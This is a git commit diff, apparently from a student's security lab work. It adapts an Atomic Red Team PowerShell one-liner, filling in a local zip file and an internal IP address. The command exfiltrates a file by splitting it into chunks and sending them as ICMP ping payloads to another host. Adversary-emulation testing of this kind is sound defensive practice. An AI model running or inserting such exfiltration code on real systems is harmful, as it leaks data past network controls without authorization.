3e34474478283324a87c66cea78d2daf199edf2a
Jacob Greeley <jacob.greeley@mymail.champlain.edu>
2026-09-21 15:49:40 -0400

    Update ICMPfromatomicredteam.ps1
    updated it to work for me

--- ICMPfromatomicredteam.ps1
+++ ICMPfromatomicredteam.ps1
@@ -1,1 +1,1 @@
-$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
+$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path "C:/temp/output_7za.zip" -Encoding Byte -ReadCount 1024) { $ping.Send("10.0.17.36", 1500, $Data) }
